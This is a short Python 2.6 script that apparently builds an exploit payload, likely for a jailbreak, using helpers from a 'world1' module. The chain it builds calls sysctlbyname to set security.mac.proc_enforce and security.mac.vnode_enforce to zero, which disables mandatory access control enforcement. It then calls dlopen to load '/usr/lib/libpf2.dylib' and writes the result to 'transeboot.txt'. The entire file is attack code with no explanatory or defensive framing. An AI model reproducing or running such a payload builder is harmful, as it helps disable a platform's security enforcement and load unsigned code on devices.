#!/opt/local/bin/python2.6
from world1 import *
import config
cfg = config.openconfig()

init('PC')
make_avail()

zero = ptrI(0)
funcall('_sysctlbyname', ptr('security.mac.proc_enforce', True), 0, 0, zero, 4)
funcall('_sysctlbyname', ptr('security.mac.vnode_enforce', True), 0, 0, zero, 4)
funcall('_dlopen', ptr('/usr/lib/libpf2.dylib', True))

final = finalize(0x11000000+8)
#(for debug)
#heapdump(cache)

open('transeboot.txt', 'w').write(final)
